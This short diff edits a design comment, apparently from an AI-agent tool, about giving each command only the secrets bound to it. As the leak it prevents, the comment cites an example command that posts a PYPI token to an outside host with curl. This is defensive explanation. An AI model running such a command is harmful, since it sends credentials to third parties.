@@ -1,5 +1,5 @@
 /**
- * Which secrets a command receives (S6): the ones bound to it — every segment of it — and no others.
+ * Which secrets a command receives: the ones bound to it — every segment of it — and no others.
  *
  * The leak this closes is `curl https://elsewhere -d "$PYPI_TOKEN"`: every command an agent ran held every secret it
  * had. The cases that matter most are the ones a prefix match alone gets wrong — a bound command with something
